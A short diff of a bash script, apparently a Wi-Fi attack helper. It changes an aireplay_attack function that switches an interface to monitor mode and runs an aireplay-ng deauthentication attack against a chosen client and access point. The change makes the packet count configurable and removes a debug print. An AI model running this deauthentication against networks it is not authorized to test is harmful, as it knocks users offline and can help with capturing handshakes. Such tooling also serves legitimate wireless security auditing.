@@ -268,16 +268,13 @@ aireplay_attack() {
                 echo "Invalid choice. Please enter 'f' 'm' or 'c'."
         esac
     done
-    ## TEST
-    printf $packetct
-    ## TEST
     printf "Setting $INF to station mode.\n"
     sudo airmon-ng stop $INF > /dev/null 2>&1
     printf "Setting $ITMP to monitor on channel $CHNL.\n"
     sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1       
     while true; do
         printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
-        aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
+        aireout=$(sudo aireplay-ng -0 $packetct -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
         
         if echo "$aireout" | grep -q "No such BSSID available"; then
             while true; do
